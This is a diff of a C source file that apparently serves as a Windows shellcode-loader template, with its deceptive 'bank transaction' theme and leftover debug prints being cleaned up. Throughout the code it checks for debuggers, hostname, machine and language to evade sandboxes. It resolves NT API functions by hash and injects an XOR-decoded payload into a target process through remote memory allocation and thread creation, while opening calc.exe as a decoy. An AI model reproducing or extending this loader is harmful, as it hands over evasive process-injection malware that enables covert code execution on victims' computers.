@@ -1,83 +1,77 @@
 #include "definitions.h"
 
+// Define a random value based on compile-time constants
 #define RANDOM_VAL (__TIME__[3] * __TIME__[6])
 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
 
-    // srand(time(NULL));
-    uint16_t key = %XOR_KEY%;
+    // Seed the random number generator
+    srand(time(NULL));
+    uint16_t key = %XOR_KEY%; // Placeholder for XOR key
     char path[MAX_PATH]; 
-    int min = 3000;
-    int max = 15000;
+    int min = 3000; // Minimum range for random money
+    int max = 15000; // Maximum range for random money
     int range = max - min + 1;
-    int money =  min + (int)(rand() / (double)RAND_MAX * range) + RANDOM_VAL;
-    int money_spent = 0;
+    int money =  min + (int)(rand() / (double)RAND_MAX * range) + RANDOM_VAL; // Calculate random money
+    int money_spent = 0; // Initialize money spent tracker
     
     printf("beginning\n");    
-    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
-    HMODULE hKernel32dll = NULL;
+    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH); // Load NTDLL module
+    HMODULE hKernel32dll = NULL; // Placeholder for Kernel32 module handle
     
-    
+    // Check if the program is being debugged
     if (!is_being_debugged()) {
-        printf("Error during file openning : %s\n", path);
+        printf("Error during file openning : %s\n", path); // Debugging detected
         return 1;
     } else {
-        hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH);
+        hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH); // Load Kernel32 module
     }
     
+    // Validate hostname and adjust money spent accordingly
     const char* hostname = get_hostname(hKernel32dll);
     if (key > 0 && is_valid_hostname(hostname)) {
-        // fprintf(file, "Your key is : %s\n", hostname);
+        // Valid hostname, no action needed
     } else {
-        money_spent += multiply(money, 3);
-        // fprintf(file, "Key is absentey : %s and money=%d\n", hostname,money_spent);
+        money_spent += multiply(money, 3); // Penalty for invalid hostname
     }
-    
-    // fprintf(file, "Bank just opened\n");
 
+    // Validate computer and adjust money spent
     if (is_valid_computer(hKernel32dll) && money > 1000) {
-        // fprintf(file, "You have enough money !!! %d is plenty\n", money);
+        // Valid computer, no action needed
     } else {
-        money_spent += divide(money, 2);
-        // fprintf(file, "You don't have enough money: %de !!!\n",money);
+        money_spent += divide(money, 2); // Penalty for invalid computer
     }
     
+    HMODULE hUser32dll = CustomGetModuleHandle(USER32_HASH); // Load User32 module
 
-    // fprintf(file, "Let's check your country\n");
-    HMODULE hUser32dll = CustomGetModuleHandle(USER32_HASH);
-
+    // Validate language settings and adjust money spent
     if (!is_valid_language(hKernel32dll, hUser32dll)) {
-        money_spent += add(money, 500);
+        money_spent += add(money, 500); // Penalty for invalid language
     }
 
-    // Other checks todo
+    // Other checks todo (placeholder for additional validations)
 
+    // Launch calculator as a demonstration
     ShellExecute(NULL, "open", "C:\\Windows\\System32\\calc.exe", NULL, NULL, SW_SHOWNORMAL);
 
     if (money_spent) {
+        // Introduce delays if money was spent
         int min_delay = 300;
         int max_delay = 800;
         int delay;
-        // fprintf(file, "Transaction is starting ...\n");
         for (int i = 0; i < 100; i+=12) {
-            // fprintf(file, "Transaction ongoing (%d%%), please wait ...\n", i);
-            delay = min_delay ;//+ (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
-            Sleep(delay);
+            delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
+            Sleep(delay); // Simulate processing delay
         }
-        // fprintf(file , "Transaction in progress (100%%), please wait ...\n");
-        // fprintf(file, "Transaction completed, you sent 1 peso to Elon Musk\n");
-        // fprintf(file, "Bank is closed, we hope to see you soon !\n");
-        // fclose(file);
     } else {
+        // Execute payload if no money was spent
         SIZE_T regionSize = sizeof(payload);
         PVOID exec = NULL;
         DWORD old_protect = 0;
         HANDLE th;
         BOOL rv;
         
-        // fprintf(file, "You have a nice account ! Let's get the transaction done !\n");
-        // fclose(file);
-        
+        // Resolve function pointers for memory and thread operations
         NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
         NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
         NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_PROTECT_HASH);
@@ -86,11 +80,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
         OpenProc _OpenProcess = (OpenProc)CustomGetProcAdress(hKernel32dll, OPEN_PROCESS_HASH);
         CloseHndle _CloseHandle = (CloseHndle)CustomGetProcAdress(hKernel32dll, CLOSE_HANDLE_HASH);
         
-        
+        // Retrieve target process ID
         DWORD pid = _GetProcessID(hKernel32dll, TARGET_PROCESS_NAME_HASH);
 
+        // Open target process
         HANDLE hProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
         if (hProcess == NULL) {
+            // Handle process opening failure
             MessageBox(NULL, "Echec d'ouverture du processus cible.\n", "Erreur", MB_OK | MB_ICONERROR);
             DWORD error = GetLastError();
             char errorMessage[256];
@@ -99,26 +95,24 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int n
             return -1;
         }
 
-        // Allocating executable memory
+        // Allocate executable memory in the target process
         _NtAlocVirtMem(hProcess, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         
-        %SHELLCODE_DECODER%
+        %SHELLCODE_DECODER% // Placeholder for shellcode decoding logic
         
         // Copy shellcode into allocated memory
         _NtWriteVirtMem(hProcess, exec, payload, sizeof(payload), NULL);
         
-        // Changing memory protection to PAGE_EXECUTE_READ
+        // Change memory protection to executable
         _NtProtectVirtMem(hProcess, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);
         
-        // Executing shellcode in a new thread
+        // Create a new thread to execute the shellcode
         _NtCreateThreadEx(&th, GENERIC_ALL, NULL, hProcess, exec, NULL, false, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
         
-        // Waiting for thread to finish
-        // _NtWaitForSingleObj(th, false, NULL);
-
+        // Close handles to clean up
         _CloseHandle(th);
         _CloseHandle(hProcess);
     }
 
-    return 0;
+    return 0; // Exit the program
 }
